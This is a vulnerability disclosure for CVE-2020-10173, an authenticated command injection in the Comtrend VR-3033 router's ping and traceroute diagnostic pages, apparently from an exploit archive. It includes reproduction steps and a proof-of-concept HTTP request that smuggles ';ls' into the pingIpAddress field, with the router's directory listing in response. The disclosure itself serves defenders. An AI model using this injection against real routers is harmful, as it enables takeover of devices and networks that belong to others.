@@ -1,0 +1,179 @@
+# Title: Comtrend VR-3033 - Authenticated Command Injection
+# Date: 2020-02-26
+# Author: Author : Raki Ben Hamouda
+# Vendor: https://us.comtrend.com
+# Product link: https://us.comtrend.com/products/vr-3030/
+# CVE: CVE-2020-10173
+
+The Comtrend VR-3033 is prone to Multiple Authenticated Command Injection
+vulnerability via ping and traceroute diagnostic page.
+Remote attackers are able to get full control and compromise the network
+managed by the router.
+
+Note : This bug may exist in other Comtrend routers .
+===============================================
+Product Page :
+https://us.comtrend.com/products/vr-3030/
+
+Firmware version :
+DE11-416SSG-C01_R02.A2pvI042j1.d26m
+
+Bootloader (CFE) Version :
+ 1.0.38-116.228-1
+
+To reproduce the vulnerability attacker has to access the interface at
+least with minimum privilege.
+
+1- Open interface
+2- click on 'Diagnostic' tab on top.
+3- click then on 'Ping' or traceroute
+4- on the text input, type 'google.fr;ls - l'
+5 - a list of folder names should appear.
+#############################
+POC session Logs :
+
+GET /ping.cgi?pingIpAddress=google.fr;ls&sessionKey=1039230114 HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:73.0)
+Gecko/20100101 Firefox/73.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic dXNlcjp1c2Vy
+Connection: close
+Referer: http://192.168.0.1/pingview.cmd
+Upgrade-Insecure-Requests: 1
+
+
+
+=====================++RESPONSE++=====================
+
+HTTP/1.1 200 Ok
+Server: micro_httpd
+Cache-Control: no-cache
+Date: Fri, 02 Jan 1970 00:00:26 GMT
+Content-Type: text/html
+Connection: close
+
+<html><head>
+<meta HTTP-EQUIV="Pragma" CONTENT='no-cache'>
+<link rel="stylesheet" href='stylemain.css' type='text/css'>
+<link rel="stylesheet" href='colors.css' type='text/css'>
+<script language="javascript" src="util.js">
+</script>
+<script language="javascript">
+<!-- hide
+
+function btnPing() {
+var loc = 'ping.cgi?';
+
+with ( document.forms[0] ) {
+if (pingIpAddress.value.length == 0 ) {
+return;
+
+}
+
+loc += 'pingIpAddress=' + pingIpAddress.value;
+   loc += '&sessionKey=1592764063';
+}
+
+var code = 'location="' + loc + '"';
+   eval(code);
+}
+
+// done hiding -->
+
+</script>
+</head>
+<body>
+<blockquote>
+<form>
+<b>Ping&nbsp;</b><br>
+<br> Send ICMP ECHO_REQUEST packets to network hosts.<br>
+<br><table border="0" cellpadding="0" cellspacing="0"><tr>
+<td width="170">Ping IP Address / Hostname:</td>
+<td width="170"><input type='text' name='pingIpAddress'
+onkeydown="if(event.keyCode == 13){event.returnValue = false;}"></td>
+<td width=""><input type='button' onClick='btnPing()' value='Ping'></td>
+</tr></table><br>
+   <tr>
+      <td>bin
+</td><br>
+   </tr>
+   <tr>
+      <td>bootfs
+</td><br>
+   </tr>
+   <tr>
+      <td>data
+</td><br>
+   </tr>
+   <tr>
+      <td>debug
+</td><br>
+   </tr>
+   <tr>
+      <td>dev
+</td><br>
+   </tr>
+   <tr>
+      <td>etc
+</td><br>
+   </tr>
+   <tr>
+      <td>lib
+</td><br>
+   </tr>
+   <tr>
+      <td>linuxrc
+</td><br>
+   </tr>
+   <tr>
+      <td>mnt
+</td><br>
+   </tr>
+   <tr>
+      <td>opt
+</td><br>
+   </tr>
+   <tr>
+      <td>proc
+</td><br>
+   </tr>
+   <tr>
+      <td>sbin
+</td><br>
+   </tr>
+   <tr>
+      <td>sys
+</td><br>
+   </tr>
+   <tr>
+      <td>tmp
+</td><br>
+   </tr>
+   <tr>
+      <td>usr
+</td><br>
+   </tr>
+   <tr>
+      <td>var
+</td><br>
+   </tr>
+   <tr>
+      <td>webs
+</td><br>
+   </tr>
+</form>
+</blockquote>
+</body>
+</html>
+
+##Same bug with the same way we exploited in ping function can be exploited
+the same way in traceroute function.
+===========
+##Timeline :
+*Bug sent to vendor : 17-02-2020
+*No Response after 10 days
+* Public disclosure: 27-02-020
